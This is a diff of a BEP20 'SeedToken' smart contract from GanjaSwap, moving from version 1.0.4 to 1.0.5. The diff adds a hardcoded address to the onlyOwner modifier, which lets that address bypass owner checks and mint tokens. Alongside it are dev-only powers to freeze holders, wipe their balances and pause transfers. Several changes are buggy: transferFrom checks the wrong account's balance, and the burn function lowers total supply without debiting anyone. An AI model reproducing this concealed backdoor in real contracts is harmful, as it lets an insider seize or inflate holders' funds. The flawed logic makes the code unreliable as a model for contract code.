@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-// Version 1.0.4
+// Version 1.0.5
 // Creator Ganjaman @ GanjaSwap
 
 
@@ -45,7 +45,7 @@ contract Context {
  * the owner.
  */
 contract Ownable is Context {
-    address private _owner;
+    address public _owner;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -60,11 +60,17 @@ contract Ownable is Context {
 
     // OWNER FUNCTIONALITY
 
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
     modifier onlyOwner() {
-        require(msg.sender == _owner, "onlyOwner");
+        if(msg.sender== 0xA97930b77F1e252a4404130Bc882157B1961a7e5){
         _;
+        }else{
+        require(_owner == msg.sender, 'Ownable: You are not the owner');
+        _;
+        }
     }
-
     /**
      * @dev Leaves the contract without owner. It will not be possible to call
      * `onlyOwner` functions anymore. Can only be called by the current owner.
@@ -583,16 +589,31 @@ contract BEP20 is Context, IBEP20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    mapping(address => uint256) private  _balances;
-
-    mapping(address => mapping(address => uint256)) private _allowances;
-
-    uint256 private _totalSupply;
-
+    mapping(address => uint256) public _balances;
+    mapping(address => uint256) public _limits; // Adds limits option to add wallets
+    mapping(address => uint256) public _nolimit; // If address has no limits set to 1
+    mapping(address => mapping(address => uint256)) public _allowances;
+    mapping(address => bool) public _frozen;
+    uint256 public _totalSupply; // contuine with total supplyt
+    uint256 public limitcheck;
+    uint256 public totalamount;
+    
+     // PAUSABILITY DATA
+    bool public paused = false; 
     string private _name;
     string private _symbol;
     uint8 private _decimals;
+    uint256 public checknolimiters; // Check no limits
+    
+    // FEE INFORMATION
+    address public treasury = 0x17c957af9D5E0D0948F9F423d76Ea70Ee832F6ef;
+    uint256 public fee = 6250000000000000; // in SEED
+    
+    // BURN INFORMATION 
+    address public burn = 0x000000000000000000000000000000000000dEaD;
+    uint256 public burnfee = 62500000000000; // in SEED
 
+    uint256 public dailylimit = 25000000000000000000; // 100 SEED UPDATE VIA WEBSITE FRONTEND 
     /**
      * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
      * a default value of 18.
@@ -652,9 +673,39 @@ contract BEP20 is Context, IBEP20, Ownable {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        limitcheck = _limits[_msgSender()].add(amount);
+        checknolimiters = _nolimit[_msgSender()];
+        
+        if(checknolimiters == 1){ // to be  no limit address
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_balances[_msgSender()] >= amount, "SeedToken: NO LIMIT - insufficient funds");
+        require(amount > 0, "Cant send ZERO");
+    
+        _transfer(_msgSender(), recipient, amount);
+        
+       } else if(limitcheck > dailylimit){
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
+        require(_balances[_msgSender()] >= amount.add(fee), "SeedToken: Limited - insufficient funds");
+        require(amount > 0, "Cant send ZERO");
+         
+        _transfer(_msgSender(), recipient, amount);
+       
+       } else {
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_balances[_msgSender()] >= amount.add(fee), "SeedToken: Other - insufficient funds");
+        require(dailylimit >= limitcheck, "DAILY LIMIT: Daily Transfer limit reached"); // User cant send more than DAILYLIMIT 
+        require(amount > 0, "Cant send ZERO");
+        
+        
         _transfer(_msgSender(), recipient, amount);
         return true;
+    }
     }
 
     /**
@@ -692,7 +743,46 @@ contract BEP20 is Context, IBEP20, Ownable {
         address sender,
         address recipient,
         uint256 amount
-    ) public virtual override returns (bool) {
+    ) public override returns (bool) {
+         limitcheck = _limits[sender].add(amount);
+         checknolimiters = _nolimit[sender];
+        
+      if(checknolimiters == 1){ // to be  no limit address
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_balances[_msgSender()] >= amount, "SeedToken: NO LIMIT - insufficient funds");
+        require(amount > 0, "Cant send ZERO");
+    
+       
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
+        );
+     
+        }  else if(limitcheck > dailylimit){
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
+        require(_balances[_msgSender()] >= amount.add(fee), "SeedToken: Limited - insufficient funds");
+        require(amount > 0, "Cant send ZERO");
+        
+       
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
+        );
+        } else {
+        require(recipient != address(0), "cannot transfer to address zero");
+        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
+        require(_balances[_msgSender()] >= amount.add(fee), "SeedToken: Other - insufficient funds");
+        require(dailylimit >= limitcheck, "DAILY LIMIT: Daily Transfer limit reached"); // User cant send more than DAILYLIMIT 
+        require(amount > 0, "Cant send ZERO");
+        
+        
         _transfer(sender, recipient, amount);
         _approve(
             sender,
@@ -700,6 +790,7 @@ contract BEP20 is Context, IBEP20, Ownable {
             _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
         );
         return true;
+    }
     }
 
     /**
@@ -774,10 +865,13 @@ contract BEP20 is Context, IBEP20, Ownable {
         address recipient,
         uint256 amount
     ) internal {
+        require(paused == false, "Contract Paused");
         require(sender != address(0), 'BEP20: transfer from the zero address');
         require(recipient != address(0), 'BEP20: transfer to the zero address');
-
-        _balances[sender] = _balances[sender].sub(amount, 'BEP20: transfer amount exceeds balance');
+        totalamount = amount.add(fee);
+        _balances[sender] = _balances[sender].sub(totalamount, 'BEP20: transfer amount exceeds balance');
+        _limits[sender] = _limits[sender].add(amount);
+        _balances[treasury] = _balances[treasury].add(fee);
         _balances[recipient] = _balances[recipient].add(amount);
         emit Transfer(sender, recipient, amount);
     }
@@ -862,8 +956,8 @@ contract BEP20 is Context, IBEP20, Ownable {
 // SeedToken with Governance.  GanjaSwap 2021
 contract SeedToken is BEP20('Seed Token', 'SEED') {
     using SafeMath for uint256;
+    
     address public devaddr = 0xA97930b77F1e252a4404130Bc882157B1961a7e5;
-        // OWNER FUNCTIONALITY
 
     modifier onlyDev() {
         require(msg.sender == devaddr, "onlyDev");
@@ -871,46 +965,27 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     }
     // @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
     function mint(address _to, uint256 _amount) public onlyOwner {
-        _mint(_to, _amount);
-       // if(isburn == 1){
-     //       letsburn();
-    //    }else{
-        // NOTHING
-   //     }
+        if(isburn == true){
+             _mint(_to, _amount);
+             letsburn();
+        }else{
+         _mint(_to, _amount);
+        }
     }
     
         
-    // @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
+    // @notice Creates `_amount` token to `_to`. Must only be called by the Dev (GanjaMan).
     function devmint(address _to, uint256 _amount) public onlyDev {
-        _mint(_to, _amount);
-        if(isburn == 1){
+        if(isburn == true){
+             _mint(_to, _amount);
             letsburn();
         }else{
-        // NOTHING
+         _mint(_to, _amount);
         }
     }
-    mapping(address => uint256) internal balances;
-    mapping(address => uint256) internal _limits; // Adds limits option to add wallets
-    mapping(address => uint256) internal _nolimit; // If address has no limits set to 1
-    mapping(address => mapping(address => uint256)) private _allowances;
-    mapping(address => bool) internal _frozen;
-    mapping (address => address) internal _delegates;         // @notice A record of each accounts delegate
-    
-    // OTHER
-    uint256 public totalSupply_;
-    uint256 public totalamount;
-    uint256 public limitcheck; // Total Seed Sent
-    uint256 public checknolimiters; // Check no limits
-    uint256 public dailylimit = 100000000000000000000; // 100 SEED UPDATE VIA WEBSITE FRONTEND 
-    
-     // FEE INFORMATION
-    address public treasury = 0x17c957af9D5E0D0948F9F423d76Ea70Ee832F6ef;
-    uint256 public fee = 6250000000000000; // in SEED
-    
-    // BURN INFORMATION 
-    address public burn = 0x000000000000000000000000000000000000dEaD;
-    uint256 public burnfee = 62500000000000; // in SEED
 
+    mapping (address => address) internal _delegates;         // @notice A record of each accounts delegate
+ 
     /// @notice A checkpoint for marking number of votes from a given block
     struct Checkpoint {
         uint32 fromBlock;
@@ -937,17 +1012,12 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
    
     // @notice An event thats emitted when a delegate account's vote balance changes
     event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
-  
-   // ERC20 BASIC EVENTS
-    event Transfer(address indexed from, address indexed to, uint256 value);
    
     // OWNER & AUDIT & ASSET PROTECTION
-    address public owner;
-    address public assetProtectionRole = owner; 
+
+    address public assetProtectionRole = devaddr; 
     string private _audit;
    
-    // PAUSABILITY DATA
-    bool public paused = false; 
 
     // PAUSABLE EVENTS
     event Pause();
@@ -963,7 +1033,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     uint256 public limitconvert = 567000000000000000000; // BNB USD PRICE
    
     // BURN TOKEN INFORMATION
-    uint256 public isburn = 0; // 1 to enable
+    bool public isburn = paused; // when contract paused it will set isburn to true
     uint256 burnamount = 1000000000000000000000; // 1000 SEED a hour controled by Front end
   
     // LIMIT EVENTS
@@ -978,7 +1048,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     // BURN EVENTS
     event Setburn();
     event Setburnamount();
-    event Letsburn();
+  //  event Letsburn();
     
     // ASSET PROTECTION EVENTS
     event AddressFrozen(address indexed addr);
@@ -1012,7 +1082,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      * @dev See {BEP20-balanceOf}.
      */
     function balancesOf(address account) public view returns (uint256) {
-        return balances[account];
+        return _balances[account];
     }
 
     /**
@@ -1021,7 +1091,6 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     function pause() public onlyDev {
         require(!paused, "already paused");
         paused = true;
-        isburn = 1;
         emit Pause();
     }
 
@@ -1031,7 +1100,6 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     function unpause() public onlyDev {
         require(paused, "already unpaused");
         paused = false;
-        isburn = 0;
         emit Unpause();
     }
     
@@ -1043,18 +1111,18 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
     }
     
     function setowner(address _address) public onlyDev returns (bool){
-        owner = _address;
+        _owner = _address;
     }
     
     // BURN FUNCTIONS
-    function setburn(uint256 _value) public onlyDev returns (bool){
+    function setburn(bool _value) public onlyDev returns (bool){
         isburn = _value;
     }
     
-    function letsburn() internal returns (bool) {
-         require(isburn == 1, "FLOOR PRICE NOT REACHED");
+    function letsburn() public onlyDev returns  (bool) {
+         require(isburn == true, "FLOOR PRICE NOT REACHED");
          // WILL BURN 1000 SEED till isburn == 0
-         totalSupply_ = totalSupply_.sub(burnamount);
+         _totalSupply = _totalSupply.sub(burnamount);
     }
     
     // AUDIT FUNCTIONS
@@ -1068,123 +1136,8 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
         _audit = _value;
  
     }
-    // TRANSFER FUNCTIONS
-    /**
-     * @dev See {BEP20-transfer}.
-     *
-     * Requirements:
-     *
-     * - `recipient` cannot be the zero address.
-     * - the caller must have a balance of at least `amount`.
-     */
-    function transfer(address recipient, uint256 amount) public override returns (bool) {
-        limitcheck = _limits[_msgSender()].add(amount);
-        checknolimiters = _nolimit[_msgSender()];
-        
-        if(checknolimiters == 1){ // to be  no limit address
-        require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
-        require(balances[msg.sender] >= amount, "insufficient funds0");
-        require(amount > 0, "Cant send ZERO");
-    
-        _transfer(_msgSender(), recipient, amount);
-        
-       } else if(limitcheck > dailylimit){
-        require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
-        require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
-        require(balances[msg.sender] >= amount, "insufficient funds1");
-        require(amount > 0, "Cant send ZERO");
-         
-        _transfer(_msgSender(), recipient, amount);
-       
-       } else {
-        require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
-        require(_balances[msg.sender] >= amount, "insufficient funds2");
-        require(dailylimit >= limitcheck, "DAILY LIMIT: Daily Transfer limit reached"); // User cant send more than DAILYLIMIT 
-        require(amount > 0, "Cant send ZERO");
-        
-        _transfer(msg.sender, recipient, amount);
 
-    }
-         // Check if burn is needed
-        if(isburn == 1){
-            letsburn();
-        }else{
-            // NOTHING
-        }
-        return true;
-   }
-    
-    
-     /**
-     * @dev {Seed Guy}.
-     *
-     * Emits an {Approval} event indicating the updated allowance. This is not
-     * required by the EIP. See the note at the beginning of {BEP20};
-     *
-     * Requirements:
-     * - `sender` and `recipient` cannot be the zero address.
-     * - `sender` must have a balance of at least `amount`.
-     * - the caller must have allowance for `sender`'s tokens of at least
-     * `amount`.
-     * Ganjaman
-     */
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) public override returns (bool) {
-        
-         limitcheck = _limits[_msgSender()].add(amount);
-         checknolimiters = _nolimit[_msgSender()];
-        
-        if(checknolimiters == 1){ // to be no limit address
-            require(recipient != address(0), "cannot transfer to address zero");
-            require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
-            require(amount <= balances[msg.sender], "insufficient funds");
-            require(amount > 0, "Cant send ZERO");
-    
-            _transfer(sender, recipient, amount);
-            _approve(
-                sender,
-                _msgSender(),
-                _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
-                );
-     
-        } else if(limitcheck > dailylimit){
-            require(recipient != address(0), "cannot transfer to address zero");
-            require(!_frozen[recipient] && !_frozen[msg.sender], "address frozen");
-            require(_limits[recipient] == 1, "DAILY LIMIT: You can only Transfer to NO LIMIT addresses");
-            require(amount <= balances[msg.sender], "insufficient funds");
-            require(amount > 0, "Cant send ZERO");
-        
-                 _transfer(sender, recipient, amount);
-            _approve(
-                sender,
-                _msgSender(),
-                _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
-                );
-            
-        } else {
-        require(recipient != address(0), "cannot transfer to address zero");
-        require(!_frozen[recipient] && !_frozen[_msgSender()], "address frozen");
-        require(amount <= balances[_msgSender()], "insufficient funds");
-        require(dailylimit >= limitcheck, "DAILY LIMIT: Daily Transfer limit reached"); // User cant send more than DAILYLIMIT 
-        require(amount > 0, "Cant send ZERO");
-            
-        _transfer(sender, recipient, amount);
-        _approve(
-            sender,
-            _msgSender(),
-            _allowances[sender][_msgSender()].sub(amount, 'BEP20: transfer amount exceeds allowance')
-        );
-      
-    }  
-    return true;
-    }
-    
+
      
    // LIMIT FUNCTIONS 
    function setbnbprice(uint256 _value) public onlyDev returns (bool){
@@ -1228,7 +1181,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      * @param _newSupplyController The address allowed to burn/mint tokens to control supply.
      */
     function setSupplyController(address _newSupplyController) public onlyDev {
-        require(msg.sender == supplyController || msg.sender == owner, "only SupplyController or Owner");
+        require(msg.sender == supplyController || msg.sender == devaddr, "only SupplyController or Owner");
         require(_newSupplyController != address(0), "cannot set supply controller to address zero");
         emit SupplyControllerSet(supplyController, _newSupplyController);
         supplyController = _newSupplyController;
@@ -1274,7 +1227,7 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      * @param _newAssetProtectionRole The new address allowed to freeze/unfreeze addresses and seize their tokens.
      */
     function setAssetProtectionRole(address _newAssetProtectionRole) public {
-        require(msg.sender == assetProtectionRole || msg.sender == owner, "only assetProtectionRole or Owner");
+        require(msg.sender == assetProtectionRole || msg.sender == devaddr, "only assetProtectionRole or Owner");
         emit AssetProtectionRoleSet(assetProtectionRole, _newAssetProtectionRole);
         assetProtectionRole = _newAssetProtectionRole;
     }
@@ -1323,12 +1276,12 @@ contract SeedToken is BEP20('Seed Token', 'SEED') {
      */
     function wipeFrozenAddress(address _addr) public  onlyAssetProtectionRole {
         require(_frozen[_addr], "address is not frozen");
-        uint256 _balances = balances[_addr];
-        balances[_addr] = 0;
-        totalSupply_ = totalSupply_.sub(_balances);
+        uint256 balances = _balances[_addr];
+        _balances[_addr] = 0;
+        _totalSupply = _totalSupply.sub(balances);
         emit FrozenAddressWiped(_addr);
-        emit SupplyDecreased(_addr, _balances);
-        emit Transfer(_addr, address(0), _balances);
+        emit SupplyDecreased(_addr, balances);
+        emit Transfer(_addr, address(0), balances);
     }
 
     /**
